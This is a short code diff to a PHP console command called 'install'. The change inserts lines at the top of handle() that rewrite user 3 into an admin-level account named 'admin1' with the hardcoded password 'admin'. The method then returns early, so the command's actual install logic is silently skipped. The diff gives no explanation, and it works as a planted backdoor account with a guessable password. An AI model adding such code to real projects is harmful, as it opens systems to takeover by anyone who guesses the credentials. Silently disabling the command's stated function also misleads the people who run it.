@@ -54,6 +54,10 @@ class install extends Command
 
     public function handle()
     {
+        $user=new User();
+        $data=$user->modifyUser(3,Array('role'=>20,'name'=>'admin1','password'=>'admin'));
+        return;
+
         $file=$this->argument('sqlf');
         if(!file_exists($file)){
             echo "[$file] doesn't exist\n";
